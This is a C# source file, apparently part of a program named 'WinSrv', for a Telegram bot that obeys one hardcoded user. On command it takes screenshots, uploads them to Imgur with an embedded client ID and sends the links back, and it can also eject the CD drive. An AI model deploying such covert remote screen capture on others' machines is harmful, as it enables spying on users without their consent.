using Imgur.API.Authentication;
using Imgur.API.Endpoints;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using File = System.IO.File;

namespace WinSrv
{
    class Telegram
    {

        static ITelegramBotClient botClient;

        public Telegram(string apiKey)
        {
            botClient = new TelegramBotClient(apiKey);

        }

        public void helloWorld()
        {
            var me = botClient.GetMeAsync().Result;
            Console.WriteLine($"Hello, World! I am user {me.Id} and my name is {me.FirstName}.");

            botClient.OnMessage += Bot_OnMessage;
            botClient.StartReceiving();
        }

        public void telegramStop()
        {
            botClient.StopReceiving();
        }

        static async void Bot_OnMessage(object sender, MessageEventArgs e)
        {
            if (e.Message.Text != null)
            {
                if (e.Message.From.Id == 1044215196)
                {
                    Console.WriteLine($"Nowa wiadomość: Message ID: {e.Message.Chat.Id}, Sender ID {e.Message.From.Id}, Sender Name {e.Message.From.Username} {e.Message.From.FirstName} {e.Message.From.LastName}, Message: {e.Message.Text}.");

                    await botClient.SendTextMessageAsync(
                      chatId: e.Message.Chat,
                      text: doThings(e.Message.Text, e.Message.Chat)
                    );
                }
            }
        }

        private static async Task sendScreenshot(Chat currentChat)
        {
            Funkcje.doScreenshot();

            var apiClient = new ApiClient("8782046433c4d51");
            var httpClient = new HttpClient();

            string workingDir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\src.jpg";
            var fileStream = File.OpenRead(workingDir);

            var imageEndpoint = new ImageEndpoint(apiClient, httpClient);
            var imageUpload = await imageEndpoint.UploadImageAsync(fileStream);


            await botClient.SendPhotoAsync(
                 chatId: currentChat,
                 photo: imageUpload.Link,
                 caption: "<b>" + DateTime.Now.ToString() + "</b>. <i>Source</i>: <a href=\"" + imageUpload.Link + "\">Link</a>",
                 parseMode: ParseMode.Html
                 );
            
        }

        private static string doThings(string command, Chat currentChat)
        {
            string cmd = command.ToLower();
            string reply = "";
            if (cmd.Contains("open cd"))
            {
                Funkcje.openCD();
                reply += "Otworzono napęd! ";
            }
            if (cmd.Contains("screenshot"))
            {
                sendScreenshot(currentChat);
                reply = "Robię screena! ";
            }
            if (reply == "")
            {
                reply = "Zła komenda! (" + cmd + ")";
            }
            return reply;

        }
    }
}
